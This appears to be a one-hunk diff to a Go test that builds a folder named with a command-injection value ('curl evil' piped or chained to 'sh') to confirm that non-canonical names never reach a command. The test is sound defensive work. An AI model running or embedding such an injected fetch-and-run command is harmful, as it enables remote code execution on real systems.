@@ -661,7 +661,7 @@ lessons:
 
 	// A candidate under folders that are not canonical ids counts but never
 	// reaches a command, even when it has the most candidates.
-	evil := filepath.Join(root, "skills", "x;curl evil|sh;", "id", ".meta")
+	evil := filepath.Join(root, "skills", "x;curl evil;sh;", "id", ".meta")
 	if err := os.MkdirAll(evil, 0o755); err != nil {
 		t.Fatal(err)
 	}
